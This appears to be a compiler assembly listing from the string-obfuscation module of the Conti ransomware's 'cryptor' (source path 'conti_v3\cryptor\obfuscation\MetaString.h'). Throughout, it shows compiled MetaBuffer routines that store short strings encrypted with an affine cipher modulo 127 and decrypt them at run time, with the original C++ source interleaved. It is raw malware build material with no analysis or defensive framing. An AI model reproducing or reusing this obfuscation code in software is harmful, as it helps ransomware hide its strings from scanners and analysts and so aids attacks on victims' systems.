_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 70	 mov	 BYTE PTR [rcx+1], 112	; 00000070H
  00007	c6 41 02 22	 mov	 BYTE PTR [rcx+2], 34	; 00000022H
  0000b	c6 41 03 55	 mov	 BYTE PTR [rcx+3], 85	; 00000055H
  0000f	c6 41 04 22	 mov	 BYTE PTR [rcx+4], 34	; 00000022H
  00013	c6 41 05 09	 mov	 BYTE PTR [rcx+5], 9
  00017	c6 41 06 22	 mov	 BYTE PTR [rcx+6], 34	; 00000022H
  0001b	c6 41 07 6c	 mov	 BYTE PTR [rcx+7], 108	; 0000006cH
  0001f	c6 41 08 22	 mov	 BYTE PTR [rcx+8], 34	; 00000022H
  00023	c6 41 09 74	 mov	 BYTE PTR [rcx+9], 116	; 00000074H
  00027	c6 41 0a 22	 mov	 BYTE PTR [rcx+10], 34	; 00000022H
  0002b	c6 41 0b 22	 mov	 BYTE PTR [rcx+11], 34	; 00000022H
  0002f	c6 41 0c 22	 mov	 BYTE PTR [rcx+12], 34	; 00000022H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 51 00 00 00	 mov	 eax, 81			; 00000051H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 59	 mov	 BYTE PTR [rcx+1], 89	; 00000059H
  00007	c6 41 02 51	 mov	 BYTE PTR [rcx+2], 81	; 00000051H
  0000b	c6 41 03 04	 mov	 BYTE PTR [rcx+3], 4
  0000f	c6 41 04 51	 mov	 BYTE PTR [rcx+4], 81	; 00000051H
  00013	c6 41 05 60	 mov	 BYTE PTR [rcx+5], 96	; 00000060H
  00017	c6 41 06 51	 mov	 BYTE PTR [rcx+6], 81	; 00000051H
  0001b	c6 41 07 7e	 mov	 BYTE PTR [rcx+7], 126	; 0000007eH
  0001f	c6 41 08 51	 mov	 BYTE PTR [rcx+8], 81	; 00000051H
  00023	c6 41 09 08	 mov	 BYTE PTR [rcx+9], 8
  00027	c6 41 0a 51	 mov	 BYTE PTR [rcx+10], 81	; 00000051H
  0002b	c6 41 0b 51	 mov	 BYTE PTR [rcx+11], 81	; 00000051H
  0002f	c6 41 0c 51	 mov	 BYTE PTR [rcx+12], 81	; 00000051H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0FD@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<83,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 1e	 sub	 ecx, 30

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 37	 mov	 BYTE PTR [rcx+1], 55	; 00000037H
  00007	c6 41 02 1e	 mov	 BYTE PTR [rcx+2], 30
  0000b	c6 41 03 3d	 mov	 BYTE PTR [rcx+3], 61	; 0000003dH
  0000f	c6 41 04 1e	 mov	 BYTE PTR [rcx+4], 30
  00013	c6 41 05 51	 mov	 BYTE PTR [rcx+5], 81	; 00000051H
  00017	c6 41 06 1e	 mov	 BYTE PTR [rcx+6], 30
  0001b	c6 41 07 7b	 mov	 BYTE PTR [rcx+7], 123	; 0000007bH
  0001f	c6 41 08 1e	 mov	 BYTE PTR [rcx+8], 30
  00023	c6 41 09 28	 mov	 BYTE PTR [rcx+9], 40	; 00000028H
  00027	c6 41 0a 1e	 mov	 BYTE PTR [rcx+10], 30
  0002b	c6 41 0b 1e	 mov	 BYTE PTR [rcx+11], 30
  0002f	c6 41 0c 1e	 mov	 BYTE PTR [rcx+12], 30
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<53,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 5b	 sub	 ecx, 91			; 0000005bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6f	 mov	 BYTE PTR [rcx+1], 111	; 0000006fH
  00007	c6 41 02 5b	 mov	 BYTE PTR [rcx+2], 91	; 0000005bH
  0000b	c6 41 03 41	 mov	 BYTE PTR [rcx+3], 65	; 00000041H
  0000f	c6 41 04 5b	 mov	 BYTE PTR [rcx+4], 91	; 0000005bH
  00013	c6 41 05 27	 mov	 BYTE PTR [rcx+5], 39	; 00000027H
  00017	c6 41 06 5b	 mov	 BYTE PTR [rcx+6], 91	; 0000005bH
  0001b	c6 41 07 7c	 mov	 BYTE PTR [rcx+7], 124	; 0000007cH
  0001f	c6 41 08 5b	 mov	 BYTE PTR [rcx+8], 91	; 0000005bH
  00023	c6 41 09 0e	 mov	 BYTE PTR [rcx+9], 14
  00027	c6 41 0a 5b	 mov	 BYTE PTR [rcx+10], 91	; 0000005bH
  0002b	c6 41 0b 5b	 mov	 BYTE PTR [rcx+11], 91	; 0000005bH
  0002f	c6 41 0c 5b	 mov	 BYTE PTR [rcx+12], 91	; 0000005bH
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 60	 sub	 ecx, 96			; 00000060H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3c	 mov	 BYTE PTR [rcx+1], 60	; 0000003cH
  00007	c6 41 02 60	 mov	 BYTE PTR [rcx+2], 96	; 00000060H
  0000b	c6 41 03 7d	 mov	 BYTE PTR [rcx+3], 125	; 0000007dH
  0000f	c6 41 04 60	 mov	 BYTE PTR [rcx+4], 96	; 00000060H
  00013	c6 41 05 5c	 mov	 BYTE PTR [rcx+5], 92	; 0000005cH
  00017	c6 41 06 60	 mov	 BYTE PTR [rcx+6], 96	; 00000060H
  0001b	c6 41 07 72	 mov	 BYTE PTR [rcx+7], 114	; 00000072H
  0001f	c6 41 08 60	 mov	 BYTE PTR [rcx+8], 96	; 00000060H
  00023	c6 41 09 54	 mov	 BYTE PTR [rcx+9], 84	; 00000054H
  00027	c6 41 0a 60	 mov	 BYTE PTR [rcx+10], 96	; 00000060H
  0002b	c6 41 0b 60	 mov	 BYTE PTR [rcx+11], 96	; 00000060H
  0002f	c6 41 0c 60	 mov	 BYTE PTR [rcx+12], 96	; 00000060H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
